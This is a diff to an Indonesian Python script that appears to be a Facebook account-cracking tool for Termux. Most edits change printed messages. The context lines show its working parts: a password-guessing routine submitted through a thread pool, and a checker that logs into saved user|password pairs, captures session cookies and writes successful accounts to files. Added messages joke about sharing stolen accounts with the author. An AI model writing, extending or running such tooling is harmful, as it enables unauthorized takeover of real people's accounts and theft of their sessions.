@@ -1,5 +1,6 @@
 # pengkodean = python
 # coding oleh BintangTzy
+# Makan Dulu Sebelum Ngerecode
 # Izin dlu lah bro kalau mau recode, gk ngotak njir_-
 #Jangan Di Decompile anjir kagak ngotak goblok
 # Note : jangan di ubah lagi! nanti error, script nya udah enak
@@ -53,7 +54,7 @@ except ImportError:
 try:
 	import requests
 except ImportError:
-	cetak(nel('\t• sedang menginstall play-audio •'))
+	cetak(nel('\t• sedang menginstall Modul play-audio •'))
 	os.system('pkg install play-audio')
 	
 ###----------[ IMPORT MODULE RICH ]---------- ###
@@ -1676,7 +1677,7 @@ def passwrd():
 					pool.submit(crackmbasic,idf,pwv)
 		print('')
 	print(M+' <------------------------------------------------------------------------------------->')
-	print(f' \33[1;96m Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
+	print(f'{x}  [{h}•{x}]{h} \33[1;96m Crack Telah Selesai,Kalo Dapet \33[1;96mOK{x} \33[1;96mJangan Lupa Bagi Dua Ama Gua')
 	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
@@ -1685,7 +1686,7 @@ def passwrd():
 	if xyzondsini in ['y','Y']:
 		back()
 	else:
-		print(f'{K}>>{O} Selamat Tinggal {P}| {H}Xyzon Dev {K} << ')
+		print(f'   {K}>>{O} Selamat Tinggal {P}| {H}Xyzon Dev {K} << ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE MOBILE ]-----------------#
@@ -2098,9 +2099,9 @@ ubahP = []
 
 def file_cp():
 	dirs = os.listdir('CP')
-	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
+	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Di File Anda %s\n"%(U,til,O,U,O))
 	for file in dirs:
-		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
+		print("%s%s\33[1;96m%s"%(U,til,file));jeda(0.07)
 	try:
 		print("\n%s%s%s\33[1;96mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
 		opsi()
@@ -2138,7 +2139,7 @@ def opsi():
 			mengecek(ngecek[0].replace("",""), ngecek[1])
 		except requests.exceptions.ConnectionError:
 			continue
-	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
+	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun, Jika Dapat OneTap Bagi Dua 🗿"%(U,til,O));jeda(0.07)
 	input('%s%s%s[%s\33[1;96m Enter%s ]'%(U,til,O,U,O))
 	back()
 	
@@ -2159,7 +2160,7 @@ def mengecek(user,pw):
 	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
 	if "c_user" in session.cookies.get_dict():
 		if "Akun Anda Dikunci" in urlPost.text:
-			print("\r%s%s\33[1;96m Akun Terkunci Sesi New"%(M,til))
+			print("\r%s%s\33[1;96m Akun Anda Terkunci Sesi New"%(M,til))
 		else:
 			print("\r%s%s\33[1;96m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
 			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
@@ -2202,7 +2203,7 @@ def mengecek(user,pw):
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 					cek_apk(kuki)
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r%s \33[1;91mAkun Terpasang Autentikasi Dua Faktor			"%(M))
+				print("\r%s \33[1;91mAkun Anda Terpasang Autentikasi Dua Faktor			"%(M))
 			else:
 				print("%s%s\33[1;91mTerjadi Kesalahan"%(M,til))
 		else:
@@ -2216,7 +2217,7 @@ def mengecek(user,pw):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
 		print("%s \33[1;96m %s"%(M,oh))
 	else:
-		print("%s \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
+		print("%s \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mLogin Gagal, Kata Sandi Sudah Di Ganti Pengguna Lain"%(M))
 		  
 def scarpping_ua():
     # Url & Headers website #
